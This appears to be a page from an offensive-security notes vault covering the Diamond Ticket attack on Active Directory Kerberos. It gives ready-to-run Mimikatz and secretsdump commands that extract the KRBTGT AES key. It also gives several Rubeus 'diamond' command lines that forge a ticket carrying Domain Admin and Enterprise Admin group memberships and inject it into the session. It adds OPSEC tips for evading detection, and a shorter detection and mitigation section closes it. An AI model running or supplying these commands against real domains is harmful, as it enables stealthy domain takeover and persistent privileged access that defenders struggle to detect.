---
title: "Attack #13 — Diamond Ticket Attack"
description: "The Diamond Ticket is an evolution of the Golden Ticket that was developed to bypass modern detection mechanisms. While a Golden Ticket forges a TGT…"
category: active-directory
tags: ["active-directory", "adcs", "credential-access", "kerberos", "privilege-escalation"]
tools: ["Impacket", "Mimikatz", "Rubeus", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #13 — Diamond Ticket Attack.md"
---
# 🟠 Attack #13 — Diamond Ticket Attack

***

## 📖 How It Works

The Diamond Ticket is an **evolution of the Golden Ticket** that was developed to bypass modern detection mechanisms. While a Golden Ticket forges a TGT entirely from scratch (meaning there is no corresponding AS-REQ in the DC logs, which is a primary detection indicator), a Diamond Ticket takes a **legitimate TGT obtained through a real AS-REQ/AS-REP exchange**, decrypts it using the KRBTGT AES key, **modifies the PAC** (Privilege Attribute Certificate) to inject elevated group memberships, then re-encrypts and re-signs it. Because the ticket originated from a real authentication event, it has a valid audit trail on the DC — making it significantly harder to detect.

### Diamond Ticket vs Golden Ticket

| Aspect | Golden Ticket | Diamond Ticket |
|---|---|---|
| **TGT source** | Forged entirely offline | Real TGT from legitimate AS-REQ |
| **AS-REQ event** | ❌ Missing (primary IOC) | ✅ Present — blends with normal traffic |
| **PAC** | Entirely fabricated | Modified from legitimate PAC |
| **KRBTGT key needed** | Yes (NT hash or AES) | Yes (AES256 required for decryption) |
| **Detection difficulty** | Moderate — missing AS-REQ | Hard — requires PAC anomaly detection |
| **OPSEC level** | Medium | High |
| **Tool support** | Mimikatz, Rubeus, ticketer.py | Rubeus (`diamond` command) |

### The Full Attack Flow

```
1. Obtain KRBTGT AES256 key (via DCSync)
2. Request a legitimate TGT for your controlled user (real AS-REQ)
3. Rubeus decrypts the TGT using the KRBTGT AES key
4. Modify the PAC — inject DA/EA group memberships (RID 512, 519, etc.)
5. Re-encrypt and re-sign the TGT with the KRBTGT key
6. Inject the modified ticket into your session
7. Access any resource as DA — with a clean audit trail on the DC
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **KRBTGT AES256 key** | Required for decryption/re-encryption — NT hash alone is insufficient |
| **Domain Admin or DCSync rights** | To extract the KRBTGT key |
| **Valid domain user account** | Needed to request the initial legitimate TGT |
| **Domain SID** | For PAC modification |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Rubeus** | Windows | `diamond` subcommand — primary tool for Diamond Tickets |
| **Mimikatz** | Windows | DCSync to extract KRBTGT AES key (prerequisite step) |
| **Impacket — secretsdump.py** | Linux | Extract KRBTGT AES key from Linux |
| **Impacket — ticketer.py** | Linux | Can be used with modifications for PAC manipulation |

***

## 💻 Full Commands

### 🔵 Step 0 — Extract KRBTGT AES256 Key

```powershell
# ── Mimikatz DCSync for KRBTGT AES key ────────────────────────────────────────
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt

# Look for: aes256_hmac: b65fb27c8e0d7c5f48b16c10b4...
```

```bash
# ── Linux — secretsdump ───────────────────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local -just-dc-user krbtgt
# Extract the aes256-cts-hmac-sha1-96 key from the kerberos section
```

### 🔴 Rubeus — Forge Diamond Ticket

```powershell
# ── Standard Diamond Ticket — impersonate DA ──────────────────────────────────
.\Rubeus.exe diamond \
  /krbkey:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /user:low_user \
  /password:Password1 \
  /enctype:aes \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512 \
  /ptt

# Flags explained:
# /krbkey     = KRBTGT AES256 key
# /user       = YOUR low-priv user to request initial legitimate TGT
# /password   = YOUR password for the initial TGT request
# /enctype    = Force AES encryption (stealthy)
# /ticketuser = The user identity to embed in the modified PAC
# /ticketuserid = RID of the target user (500 = Administrator)
# /groups     = Group RIDs to inject (512=DA, 519=EA, 518=Schema Admins)
# /ptt        = Inject into current session

# ── Diamond Ticket with multiple privileged groups ────────────────────────────
.\Rubeus.exe diamond \
  /krbkey:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /user:low_user \
  /password:Password1 \
  /enctype:aes \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519,518,520 \
  /ptt

# ── Diamond Ticket with LDAP + OPSEC flags ───────────────────────────────────
.\Rubeus.exe diamond \
  /krbkey:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /user:low_user \
  /password:Password1 \
  /enctype:aes \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512 \
  /ldap /nowrap /ptt

# /ldap = Query LDAP for accurate user/group info for the PAC (most OPSEC)

# ── Verify ────────────────────────────────────────────────────────────────────
klist
dir \\DC01.corp.local\C$
```

***

## 🎯 OPSEC Tips

- **Diamond Ticket is the stealthiest TGT-based attack** — unlike Golden Ticket, a real AS-REQ exists in DC logs, so the "TGS without TGT" detection fails
- **Always use AES256** — RC4 encryption generates detectable anomalies; AES256 is standard
- **Use the `/ldap` flag** in Rubeus to pull real user attributes for the PAC — this prevents inconsistencies that could be flagged by PAC inspection
- **The KRBTGT AES key is mandatory** — unlike Golden Tickets which can use the NT hash (RC4), Diamond Tickets require the AES key for proper decryption/re-encryption

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log (DC) | TGT request — present (unlike Golden Ticket), but subsequent access may show elevated privileges |
| **4769** | Security Log (DC) | TGS requests with privileges that don't match the user's actual group memberships |
| **4624** | Security Log | Logon with DA-level privileges from a user that should be low-privilege |

**Primary detection:** Diamond Tickets require **PAC-level inspection** — comparing the group memberships claimed in the TGT's PAC against the user's actual AD group memberships. If a user's TGT claims membership in Domain Admins but their AD object shows no such membership, it's a forged or modified ticket. Microsoft Defender for Identity can perform this correlation.

***

## 🔗 Attack Chain Context

```
[Diamond Ticket] ──→ Stealthy Domain Admin Persistence
         │
         ├──→ 🎫 Stealthier Golden Ticket — has real AS-REQ in DC logs
         ├──→ 🩸 Use as DA → DCSync → extract all hashes
         ├──→ 🔒 Survives password changes (until KRBTGT reset × 2)
         ├──→ 🔗 Chain: DCSync (get KRBTGT key) → Diamond Ticket → persist
         └──→ 💀 Defeated by: KRBTGT password reset × 2, PAC inspection, MDI
```

***

> ✅ **Attack #13 — Diamond Ticket complete.**
